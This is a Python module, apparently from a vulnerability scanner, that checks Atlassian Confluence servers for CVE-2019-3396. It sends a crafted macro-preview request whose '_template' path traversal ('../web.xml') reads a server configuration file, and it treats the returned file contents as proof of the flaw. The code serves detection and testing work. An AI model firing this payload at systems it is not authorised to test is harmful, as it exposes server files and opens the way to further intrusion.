# -*- coding: utf-8 -*-
# @File  : http_confluence.py
# @Date  : 2019/12/20
# @Desc  :
# @license : Copyright(C), funnywolf 
# @Author: funnywolf
# @Contact : github.com/FunnyWolf
import re

from vulscan.common import *


class CVE_2019_3396(object):
    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        payload = self.url + "/rest/tinymce/1/macro/preview"
        try:
            self.headers[
                'Referer-Type'] = self.url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&"
            self.headers['Content-Type'] = "application/json; charset=utf-8"
            r = requests.post(payload, data=self.data, headers=self.headers)

            if r.status_code == 200 and "</web-app>" in r.text:
                m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
                if m:
                    return True
                return False
            else:
                return False
        except Exception as e:
            return False
